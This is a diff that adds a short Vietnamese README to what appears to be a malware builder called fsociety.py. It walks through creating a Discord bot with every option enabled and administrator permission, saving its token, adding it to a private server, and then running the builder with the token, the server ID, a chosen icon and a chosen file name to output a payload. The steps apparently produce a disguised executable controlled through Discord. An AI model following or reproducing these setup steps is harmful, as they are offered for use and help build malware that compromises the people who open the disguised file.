@@ -1,0 +1,6 @@
+1 Mở https://discord.com/developers/applications tạo 1 bot,tạo xong vào phần bot ở bên trái,bật hết các ô lên trừ Requires OAuth2 Code Grant
+2 Bấm reset bot token,lưu token ở đâu đấy
+3 Tạo 1 server discord riêng,add bot vào https://discord.com/oauth2/authorize?client_id=123456&permissions=8&scope=bot (12345 là id của bot tìm ở General infomation ở web lúc nãy)
+4 Mở file fsociety.py,nhập bot token,server id(chuột phải vào server vừa tạo) icon của file,icon đã cho,tên file xong enter
+5 Sau khi build ra file ở PAYLOAD
+
